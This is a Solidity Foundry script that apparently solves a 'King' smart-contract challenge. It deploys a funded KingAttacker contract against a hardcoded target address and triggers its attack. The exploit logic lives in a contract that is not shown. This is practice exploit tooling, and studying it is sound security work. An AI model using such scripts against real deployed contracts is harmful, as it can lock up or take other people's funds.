// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {King} from "../src/King.sol";
import {KingAttacker} from "../src/KingAttacker.sol";
import {Script} from "forge-std/Script.sol";

contract KingAttackerScript is Script {
    King target;
    KingAttacker attacker;
    uint256 INIT_VALUE = 1e15;

    function run() public {
        target = King(payable(0x55830F06FB5F3d85991F16A857e6868dc79601d9));
        vm.startBroadcast();
        attacker = new KingAttacker{value: INIT_VALUE * 2}(payable(address(target)), 0x50420Ad35e96cDb0fD2770341c72497b3518d2C5);
        attacker.attack{value: INIT_VALUE}();
        vm.stopBroadcast();

    }
}